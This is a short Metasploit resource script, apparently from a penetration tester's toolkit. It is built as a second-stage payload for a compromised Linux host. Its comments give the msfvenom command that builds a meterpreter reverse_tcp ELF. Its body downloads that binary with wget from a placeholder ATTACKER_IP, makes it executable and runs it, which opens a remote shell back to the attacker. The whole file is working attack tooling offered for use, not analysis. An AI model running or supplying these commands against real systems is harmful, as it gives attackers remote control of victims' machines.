# Second-stage fetch for a Linux target: pull a full meterpreter ELF over HTTP
# and run it. Feed to an existing session with `resource <this file>`, or set it
# as autorunscript on a shell handler.
#
# Build the ELF (LHOST is your attack address -- `attack tun0` exports $A_IP):
#   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$A_IP LPORT=443 \
#            -f elf -o met.elf
#
# Serve it (setup_www_tools stages /var/www/html/tools, or use `serve` from
# aliases), then replace ATTACKER_IP below. The binary is deliberately not
# committed to this repo -- rebuild it per engagement so LHOST is correct.
wget http://ATTACKER_IP/met.elf -O /tmp/met.elf
chmod 700 /tmp/met.elf
/tmp/met.elf
